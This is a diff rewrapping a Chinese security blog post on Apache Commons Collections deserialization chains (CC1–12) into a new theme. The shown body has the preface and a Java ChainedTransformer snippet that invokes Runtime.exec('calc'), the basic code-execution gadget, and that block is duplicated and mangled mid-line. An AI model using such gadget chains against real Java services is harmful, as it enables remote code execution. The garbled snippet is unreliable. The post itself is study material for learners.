@@ -1,4 +1,156 @@
-<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Commons Collections 1-12</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Commons Collections 1-12</h2><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一说JavaWeb安全就想到反序列化，一说反序列化就是CC链，那CC链是什么，这个链为什么这么重要呢？Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。这个组件大部分项目都会用到，包含一些知名的中间件，组件的Transfomer接口的子类可执行代码，再加上各种其他基本库的反序列化配合，可衍生出一整系列的CC链导致远程代码执行，影响之广和其重要性可想而知。这条链至今可能有大几年了，各种jdk版本的机制、修复和绕过揉杂在一起，结果就是 复杂 + 混乱，下面是我学习的一点记录，试图捋清楚这些链。</p>
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x0 前言一说JavaWeb安全就想到反序列化，一说反序列化就是CC链，那CC链是什么，这个链为什么这么重要呢？Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。这个组件大部分项目都会用到，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons Collections 1-12">
+<meta property="og:url" content="http://example.com/2022/05/18/Commons%20Collections/index.html">
+<meta property="og:site_name" content="Hurn&#39;s Blog">
+<meta property="og:description" content="0x0 前言一说JavaWeb安全就想到反序列化，一说反序列化就是CC链，那CC链是什么，这个链为什么这么重要呢？Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。这个组件大部分项目都会用到，">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-05-18T03:16:45.078Z">
+<meta property="article:modified_time" content="2022-06-06T11:10:31.082Z">
+<meta property="article:author" content="Hurn">
+<meta property="article:tag" content="Java Web安全">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Commons Collections 1-12</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/05/17/X86%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84Hook%E6%96%B9%E5%BC%8F/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/18/Commons%20Collections/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/18/Commons%20Collections/&text=Commons Collections 1-12"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/18/Commons%20Collections/&is_video=false&description=Commons Collections 1-12"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons Collections 1-12&body=Check out this article: http://example.com/2022/05/18/Commons%20Collections/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/18/Commons%20Collections/&name=Commons Collections 1-12&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/18/Commons%20Collections/&t=Commons Collections 1-12"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x0 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-RCE%E7%9A%84%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">0x1 RCE的基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E6%89%A7%E8%A1%8CTransform%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">0x2 执行Transform方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-1-LazyMap"><span class="toc-number">3.1.</span> <span class="toc-text">0x2.1 LazyMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-2-TiedMapEntry"><span class="toc-number">3.2.</span> <span class="toc-text">0x2.2 TiedMapEntry</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-3-TransformingComparator"><span class="toc-number">3.3.</span> <span class="toc-text">0x2.3 TransformingComparator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-4-TemplateImpl"><span class="toc-number">3.4.</span> <span class="toc-text">0x2.4 TemplateImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-5-TrAXFilter"><span class="toc-number">3.5.</span> <span class="toc-text">0x2.5 TrAXFilter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-6-InstantiateTransformer"><span class="toc-number">3.6.</span> <span class="toc-text">0x2.6 InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-readObject"><span class="toc-number">4.</span> <span class="toc-text">0x3 readObject</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-1-Commoms-Collections1"><span class="toc-number">4.1.</span> <span class="toc-text">0x3.1 Commoms Collections1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-2-Commons-Collections2"><span class="toc-number">4.2.</span> <span class="toc-text">0x3.2 Commons Collections2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-3-Commons-Collections3"><span class="toc-number">4.3.</span> <span class="toc-text">0x3.3 Commons Collections3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-4-Commons-Collections4"><span class="toc-number">4.4.</span> <span class="toc-text">0x3.4 Commons Collections4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-5-Commons-Collections5"><span class="toc-number">4.5.</span> <span class="toc-text">0x3.5 Commons Collections5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-6-Commons-Collections6"><span class="toc-number">4.6.</span> <span class="toc-text">0x3.6 Commons Collections6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-7-Commons-Collections7"><span class="toc-number">4.7.</span> <span class="toc-text">0x3.7 Commons Collections7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-8-Commons-Collections8"><span class="toc-number">4.8.</span> <span class="toc-text">0x3.8 Commons Collections8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-9-Commons-Collections9"><span class="toc-number">4.9.</span> <span class="toc-text">0x3.9 Commons  Collections9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-10-Commons-Collections10"><span class="toc-number">4.10.</span> <span class="toc-text">0x3.10 Commons Collections10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-11-Commons-Collections-11"><span class="toc-number">4.11.</span> <span class="toc-text">0x3.11 Commons Collections 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-Commons-Collections-12"><span class="toc-number">4.12.</span> <span class="toc-text">0x12 Commons Collections 12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x4 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-1-%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.</span> <span class="toc-text">0x4.1 适用版本总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-2-CC%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">5.2.</span> <span class="toc-text">0x4.2 CC链总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Commons Collections 1-12
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hurn</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-18T03:16:45.078Z" itemprop="datePublished">2022-05-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java-Web%E5%AE%89%E5%85%A8/" rel="tag">Java Web安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一说JavaWeb安全就想到反序列化，一说反序列化就是CC链，那CC链是什么，这个链为什么这么重要呢？Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。这个组件大部分项目都会用到，包含一些知名的中间件，组件的Transfomer接口的子类可执行代码，再加上各种其他基本库的反序列化配合，可衍生出一整系列的CC链导致远程代码执行，影响之广和其重要性可想而知。这条链至今可能有大几年了，各种jdk版本的机制、修复和绕过揉杂在一起，结果就是 复杂 + 混乱，下面是我学习的一点记录，试图捋清楚这些链。</p>
 <p>在服务端会去验证要序列化的类在本机上是否存在，然后存在就去执行readObject，反序列化的前提在于找一个服务器上存在的类，并且这个类readObject的函数内部某些成员直接或间接可控，而核心在于通过这个可控的成员来构造、执行恶意代码。</p>
 <h1 id="0x1-RCE的基础"><a href="#0x1-RCE的基础" class="headerlink" title="0x1 RCE的基础"></a>0x1 RCE的基础</h1><p>Commons Collections中的Transformer接口的子类，组合起来可以执行代码，跟一下细节就知道为什么能执行代码了，这里只捋思路</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs java">String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>  <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>&#125;;<br><br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>chainedTransformer.transform(<span class="hljs-keyword"><code class="language-hljs java">String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>  <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>&#125;;<br><br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>chainedTransformer.transform(<span class="hljs-keyword">null</span>);<br></code></pre></td></tr></table></figure>
@@ -274,4 +426,143 @@
 <p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
 <p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/313390.html">https://www.freebuf.com/articles/web/313390.html</a></p>
-</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x0 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-RCE%E7%9A%84%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">0x1 RCE的基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E6%89%A7%E8%A1%8CTransform%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">0x2 执行Transform方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-1-LazyMap"><span class="toc-number">3.1.</span> <span class="toc-text">0x2.1 LazyMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-2-TiedMapEntry"><span class="toc-number">3.2.</span> <span class="toc-text">0x2.2 TiedMapEntry</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-3-TransformingComparator"><span class="toc-number">3.3.</span> <span class="toc-text">0x2.3 TransformingComparator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-4-TemplateImpl"><span class="toc-number">3.4.</span> <span class="toc-text">0x2.4 TemplateImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-5-TrAXFilter"><span class="toc-number">3.5.</span> <span class="toc-text">0x2.5 TrAXFilter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-6-InstantiateTransformer"><span class="toc-number">3.6.</span> <span class="toc-text">0x2.6 InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-readObject"><span class="toc-number">4.</span> <span class="toc-text">0x3 readObject</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-1-Commoms-Collections1"><span class="toc-number">4.1.</span> <span class="toc-text">0x3.1 Commoms Collections1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-2-Commons-Collections2"><span class="toc-number">4.2.</span> <span class="toc-text">0x3.2 Commons Collections2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-3-Commons-Collections3"><span class="toc-number">4.3.</span> <span class="toc-text">0x3.3 Commons Collections3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-4-Commons-Collections4"><span class="toc-number">4.4.</span> <span class="toc-text">0x3.4 Commons Collections4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-5-Commons-Collections5"><span class="toc-number">4.5.</span> <span class="toc-text">0x3.5 Commons Collections5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-6-Commons-Collections6"><span class="toc-number">4.6.</span> <span class="toc-text">0x3.6 Commons Collections6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-7-Commons-Collections7"><span class="toc-number">4.7.</span> <span class="toc-text">0x3.7 Commons Collections7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-8-Commons-Collections8"><span class="toc-number">4.8.</span> <span class="toc-text">0x3.8 Commons Collections8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-9-Commons-Collections9"><span class="toc-number">4.9.</span> <span class="toc-text">0x3.9 Commons  Collections9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-10-Commons-Collections10"><span class="toc-number">4.10.</span> <span class="toc-text">0x3.10 Commons Collections10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-11-Commons-Collections-11"><span class="toc-number">4.11.</span> <span class="toc-text">0x3.11 Commons Collections 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-Commons-Collections-12"><span class="toc-number">4.12.</span> <span class="toc-text">0x12 Commons Collections 12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x4 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-1-%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.</span> <span class="toc-text">0x4.1 适用版本总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-2-CC%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">5.2.</span> <span class="toc-text">0x4.2 CC链总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/18/Commons%20Collections/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/18/Commons%20Collections/&text=Commons Collections 1-12"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/18/Commons%20Collections/&is_video=false&description=Commons Collections 1-12"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons Collections 1-12&body=Check out this article: http://example.com/2022/05/18/Commons%20Collections/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/18/Commons%20Collections/&title=Commons Collections 1-12"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/18/Commons%20Collections/&name=Commons Collections 1-12&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/18/Commons%20Collections/&t=Commons Collections 1-12"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Hurn
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
